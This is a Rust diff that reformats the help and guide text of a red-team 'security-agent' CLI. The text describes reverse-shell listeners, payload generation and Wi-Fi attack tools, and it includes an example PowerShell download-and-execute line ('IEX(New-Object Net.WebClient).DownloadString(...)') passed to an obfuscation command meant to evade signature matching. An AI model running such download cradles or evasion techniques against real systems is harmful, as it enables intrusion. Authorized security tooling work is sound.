@@ -16,6 +16,8 @@
 //! - **Authorized-tool-first.** Every entry that opens a socket or runs a
 //!   live-network action explicitly states the `--allow-network` opt-in.
 
+use std::fmt::Write as _;
+
 /// Help for one command: what it is, what it achieves, how to run it.
 #[derive(Debug, Clone, Copy)]
 pub struct CommandHelp {
@@ -41,15 +43,15 @@ impl CommandHelp {
     #[must_use]
     pub fn render(&self) -> String {
         let mut out = String::new();
-        out.push_str(&format!("{}\n{}\n", self.command, "=".repeat(self.command.len())));
-        out.push_str(&format!("WHAT IT IS:  {}\n", self.summary));
-        out.push_str(&format!("WHAT IT DOES FOR YOU:  {}\n", self.outcome));
-        out.push_str(&format!("USAGE:  {}\n", self.usage));
+        let _ = writeln!(out, "{}\n{}", self.command, "=".repeat(self.command.len()));
+        let _ = writeln!(out, "WHAT IT IS:  {}", self.summary);
+        let _ = writeln!(out, "WHAT IT DOES FOR YOU:  {}", self.outcome);
+        let _ = writeln!(out, "USAGE:  {}", self.usage);
         out.push_str("EXAMPLES:\n");
         for example in self.examples {
-            out.push_str(&format!("  {example}\n"));
+            let _ = writeln!(out, "  {example}");
         }
-        out.push_str(&format!("WHEN TO USE:  {}\n", self.when_to_use));
+        let _ = writeln!(out, "WHEN TO USE:  {}", self.when_to_use);
         if self.network_action {
             out.push_str(
                 "NETWORK:  This command performs live network activity; it runs only when the \
@@ -259,7 +261,9 @@ pub static ALL_COMMANDS: &[CommandHelp] = &[
         summary: "Applies PowerShell obfuscation techniques to a command.",
         outcome: "Returns several encoded/obfuscated variants that are harder for naive string matching to catch.",
         usage: "--obfuscate-ps <command>",
-        examples: &["security-agent --obfuscate-ps 'IEX(New-Object Net.WebClient).DownloadString(...)'"],
+        examples: &[
+            "security-agent --obfuscate-ps 'IEX(New-Object Net.WebClient).DownloadString(...)'",
+        ],
         when_to_use: "During Windows red-team work to vary payload signatures.",
         network_action: false,
     },
@@ -357,7 +361,10 @@ pub static ALL_COMMANDS: &[CommandHelp] = &[
         summary: "Prints the named embedded skill (general or per-tool).",
         outcome: "Gives you the full step-by-step playbook for a tool or for the agent itself.",
         usage: "--show-skill <name>",
-        examples: &["security-agent --show-skill nmap", "security-agent --show-skill security-agent"],
+        examples: &[
+            "security-agent --show-skill nmap",
+            "security-agent --show-skill security-agent",
+        ],
         when_to_use: "To read the detailed instructions for any bundled skill.",
         network_action: false,
     },
@@ -366,7 +373,10 @@ pub static ALL_COMMANDS: &[CommandHelp] = &[
         summary: "Prints the plain-language guide for one specific command or tool.",
         outcome: "The focused version of --guide for a single command, with examples.",
         usage: "--tool-help <command-or-tool>",
-        examples: &["security-agent --tool-help --listen", "security-agent --tool-help --gen-shell"],
+        examples: &[
+            "security-agent --tool-help --listen",
+            "security-agent --tool-help --gen-shell",
+        ],
         when_to_use: "When you only need instructions for one thing.",
         network_action: false,
     },
@@ -440,42 +450,94 @@ pub static GUIDE_SECTIONS: &[(&str, &str, &[&str])] = &[
     (
         "getting-started",
         "First commands to run on a new machine: status, about, guide, list tools.",
-        &["--offline-status", "--about", "--guide", "--list-tools", "--list-skills"],
+        &[
+            "--offline-status",
+            "--about",
+            "--guide",
+            "--list-tools",
+            "--list-skills",
+        ],
     ),
     (
         "reverse-shell",
         "End-to-end remote shell workflow: generate a payload, start a listener, catch the shell.",
-        &["--listen", "--gen-shell", "--analyze-payload", "--obfuscate-ps", "--gen-decoys"],
+        &[
+            "--listen",
+            "--gen-shell",
+            "--analyze-payload",
+            "--obfuscate-ps",
+            "--gen-decoys",
+        ],
     ),
     (
         "offensive",
         "Offensive red-team tooling: payloads, credential analysis, Wi-Fi audit, obfuscation.",
-        &["--gen-shell", "--hash-id", "--password-strength", "--gen-wordlist", "--obfuscate-ps", "--gen-decoys", "--analyze-handshake", "--wps-pin", "--audit-wifi", "--listen"],
+        &[
+            "--gen-shell",
+            "--hash-id",
+            "--password-strength",
+            "--gen-wordlist",
+            "--obfuscate-ps",
+            "--gen-decoys",
+            "--analyze-handshake",
+            "--wps-pin",
+            "--audit-wifi",
+            "--listen",
+        ],
     ),
     (
         "defensive",
         "Defensive hardening and analysis: passwd/sudoers/keys analysis, payload scoring, reports.",
-        &["--analyze-passwd", "--analyze-sudoers", "--analyze-keys", "--analyze-payload", "--report", "--schedule-retest"],
+        &[
+            "--analyze-passwd",
+            "--analyze-sudoers",
+            "--analyze-keys",
+            "--analyze-payload",
+            "--report",
+            "--schedule-retest",
+        ],
     ),
     (
         "planning",
         "Authorized engagement planning and execution.",
-        &["--plan-scan", "--record-findings", "--view-audit", "--view-audit-db", "--view-findings-db"],
+        &[
+            "--plan-scan",
+            "--record-findings",
+            "--view-audit",
+            "--view-audit-db",
+            "--view-findings-db",
+        ],
     ),
     (
         "tools",
         "Running real or built-in analysis tools.",
-        &["--run-tool", "--run-external-tool", "--list-tools", "--show-skill"],
+        &[
+            "--run-tool",
+            "--run-external-tool",
+            "--list-tools",
+            "--show-skill",
+        ],
     ),
     (
         "cognition",
         "Neural and cognitive features: LLM text, perplexity, plain-English routing.",
-        &["--llm-generate", "--llm-perplexity", "--ask", "--tui", "--lm-eval"],
+        &[
+            "--llm-generate",
+            "--llm-perplexity",
+            "--ask",
+            "--tui",
+            "--lm-eval",
+        ],
     ),
     (
         "databases",
         "Embedded append-only store views.",
-        &["--view-audit-db", "--view-findings-db", "--view-calibration-db", "--view-reasoning-log-db"],
+        &[
+            "--view-audit-db",
+            "--view-findings-db",
+            "--view-calibration-db",
+            "--view-reasoning-log-db",
+        ],
     ),
 ];
 
@@ -502,7 +564,7 @@ pub fn render_help_for(name: &str) -> Option<String> {
     ALL_COMMANDS
         .iter()
         .find(|h| normalize_name(h.command) == normalized)
-        .map(|h| h.render())
+        .map(CommandHelp::render)
 }
 
 /// Render one named guide section (e.g. `"reverse-shell"`).
@@ -514,8 +576,8 @@ pub fn render_section(section: &str) -> Option<String> {
         .find(|(name, _, _)| *name == normalized)
         .map(|(title, blurb, commands)| {
             let mut out = String::new();
-            out.push_str(&format!("Guide section: {title}\n"));
-            out.push_str(&format!("{}\n\n", "=".repeat(title.len() + 15)));
+            let _ = writeln!(out, "Guide section: {title}");
+            let _ = writeln!(out, "{}\n", "=".repeat(title.len() + 15));
             out.push_str(blurb);
             out.push_str("\n\n");
             for cmd in *commands {
@@ -552,7 +614,9 @@ pub fn render_reverse_shell_guide() -> String {
     out.push_str("  * 4444 is the port. Choose any unused port you can open.\n");
     out.push_str("  * --allow-network is required because the listener opens a socket.\n");
     out.push_str("  * Add a number to limit connections: --listen 4444 5\n");
-    out.push_str("  * Add an address to bind a specific interface: --listen 4444 5 192.168.1.100\n");
+    out.push_str(
+        "  * Add an address to bind a specific interface: --listen 4444 5 192.168.1.100\n",
+    );
     out.push_str("  * Add --log <path> to persist every session to a JSON Lines audit file:\n");
     out.push_str("      --listen 4444 --log sessions.jsonl\n\n");
 
@@ -604,8 +668,16 @@ mod tests {
     fn every_command_has_all_fields() {
         for help in ALL_COMMANDS {
             assert!(!help.command.is_empty(), "command name empty");
-            assert!(!help.summary.is_empty(), "summary empty for {}", help.command);
-            assert!(!help.outcome.is_empty(), "outcome empty for {}", help.command);
+            assert!(
+                !help.summary.is_empty(),
+                "summary empty for {}",
+                help.command
+            );
+            assert!(
+                !help.outcome.is_empty(),
+                "outcome empty for {}",
+                help.command
+            );
             assert!(!help.usage.is_empty(), "usage empty for {}", help.command);
             assert!(
                 !help.examples.is_empty(),
